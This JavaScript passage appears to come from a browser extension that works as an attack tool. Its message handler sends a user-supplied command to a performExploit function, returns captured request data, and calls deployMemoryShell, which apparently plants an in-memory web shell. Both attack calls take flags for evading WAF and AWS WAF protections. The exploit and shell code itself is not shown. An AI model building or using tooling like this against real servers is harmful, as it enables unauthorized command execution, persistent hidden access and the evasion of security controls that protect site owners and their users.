        console.log('[Content] Received message - awsWafEnabled:', req.awsWafEnabled, 'Type:', typeof req.awsWafEnabled);
        performExploit(req.cmd, req.wafEnabled, req.awsWafEnabled).then(res => {
            sendResponse(res);
        });
        return true;
    }
    if (req.action === "get_last_request") {
        sendResponse(lastRequestData);
        return false;
    }
    if (req.action === "deploy_memory_shell") {
        console.log('[Content] Received memory shell message - wafEnabled:', req.wafEnabled, 'Type:', typeof req.wafEnabled);
        console.log('[Content] Received memory shell message - awsWafEnabled:', req.awsWafEnabled, 'Type:', typeof req.awsWafEnabled);
        deployMemoryShell(req.wafEnabled, req.awsWafEnabled).then(res => {
            sendResponse(res);
        });
        return true;
    }
});
